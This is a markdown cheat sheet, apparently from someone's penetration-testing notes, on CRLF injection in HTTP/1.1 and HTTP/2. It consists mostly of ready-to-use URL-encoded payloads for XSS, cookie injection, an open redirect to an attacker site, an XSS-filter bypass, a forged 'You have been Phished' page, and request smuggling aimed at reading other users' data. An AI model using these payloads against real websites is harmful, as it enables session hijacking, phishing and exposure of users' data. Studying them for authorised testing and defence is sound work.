# Content 
- [HTTP/1.1 CRLF injeciton](#http11-crlf-injeciton)
  - [CRLF injeciton can lead to](#crlf-injeciton-can-lead-to)


## HTTP/1.1 CRLF injeciton
**where to inject** 
- url path
```
http://www.example.net/%0D%0A
```
- parameter
```
http://www.example.net/?param=value%0D%0A
```

### **CRLF injeciton can lead to**
#### XSS
```
http://www.example.net/?name=Bob%0D%0A<script>alert(document.domain)</script>
```
#### add a header

- add cookie

```
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue   
```


- open redirect
```
http://www.example.net/%0D%0ALocation:http://evil.site    
```
- XSS Bypass
```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e     

```
- Write HTML
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E 
```

#### Request Smuggling

if u can add headers 
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1

HTTP/1.1 200 OK
Connection: keep-alive
```

try to make smuggle request 
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1
```

or try to read other user's data
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1
```


## HTTP/2 CRLF injection 
**where to inject** 
- headers


![Screenshot_48](https://github.com/kiro6/penetration-testing-notes/assets/57776872/d87435ea-415c-4df8-85ae-c3edd954803b)

- pseudo-headers


![Screenshot_49](https://github.com/kiro6/penetration-testing-notes/assets/57776872/0ae6ab25-dfdd-454a-b9d5-0b2ccc86925d)
